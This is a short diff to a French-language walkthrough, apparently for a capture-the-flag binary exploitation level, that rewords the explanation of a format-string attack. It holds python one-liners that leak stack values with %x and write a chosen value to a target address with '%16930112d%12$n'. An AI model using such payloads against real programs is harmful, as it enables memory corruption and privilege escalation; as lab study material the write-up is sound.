@@ -10,7 +10,7 @@ python -c 'print "CCCC %x %x %x %x %x %x %x %x %x %x %x %x %x"' > /tmp/test
 
 notre adresse est a la 12 eme position donc comme le level3 on met l'adresse de la variable m : \x10\x98\x04\x08
 
-16930112d c'est le nombre a l'adresse 0x1025544 ce qui donne 16930116 en decimal il faut donc qu'on ecrive cette valeur en enlevent 4 car l'adresse fait 4 bytes
+a l'adresse 0x1025544 il y a 16930116 en decimal il faut donc qu'on ecrive cette valeur en enlevent 4 car l'adresse fait 4 bytes ce qui donne 16930112d
 
 python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/test2
 
